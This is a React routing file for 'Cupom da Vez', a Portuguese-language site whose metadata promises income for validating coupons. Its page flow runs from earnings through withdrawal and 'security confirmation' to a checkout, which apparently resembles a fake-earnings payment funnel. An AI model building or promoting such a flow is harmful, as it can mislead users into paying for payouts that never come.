import React, { useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
import { Helmet } from 'react-helmet';
import { Toaster } from '@/components/ui/toaster';
import { trackingManager } from '@/lib/tracking';
import LandingPage from '@/pages/LandingPage';
import IdentificationPage from '@/pages/IdentificationPage';
import CouponValidationPage from '@/pages/CouponValidationPage';
import LimitReachedPage from '@/pages/LimitReachedPage';
import WithdrawalMethodPage from '@/pages/WithdrawalMethodPage';
import SecurityConfirmationPage from '@/pages/SecurityConfirmationPage';
import FinalPage from '@/pages/FinalPage';
import CheckoutPage from '@/pages/CheckoutPage';

// Component to track route changes
function RouteTracker() {
  const location = useLocation();

  useEffect(() => {
    // Track page view when route changes
    trackingManager.trackPageView();
  }, [location]);

  return null;
}

function App() {
  useEffect(() => {
    // Initialize tracking on app load
    trackingManager.init();
  }, []);

  return (
    <>
      <Helmet>
        <title>Cupom da Vez - Ganhe Dinheiro com Cupons</title>
        <meta name="description" content="Participe do Cupom da Vez e ganhe dinheiro validando cupons de desconto. Sistema seguro e confiável para renda extra." />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="theme-color" content="#ffd700" />
      </Helmet>
      
      <Router>
        <RouteTracker />
        <div className="mobile-container">
          <Routes>
            <Route path="/" element={<LandingPage />} />
            <Route path="/identificacao" element={<IdentificationPage />} />
            <Route path="/validacao/:step" element={<CouponValidationPage />} />
            <Route path="/limite-atingido" element={<LimitReachedPage />} />
            <Route path="/metodo-saque" element={<WithdrawalMethodPage />} />
            <Route path="/confirmacao-seguranca" element={<SecurityConfirmationPage />} />
            <Route path="/final" element={<FinalPage />} />
            <Route path="/checkout" element={<CheckoutPage />} />
          </Routes>
        </div>
        <Toaster />
      </Router>
    </>
  );
}

export default App;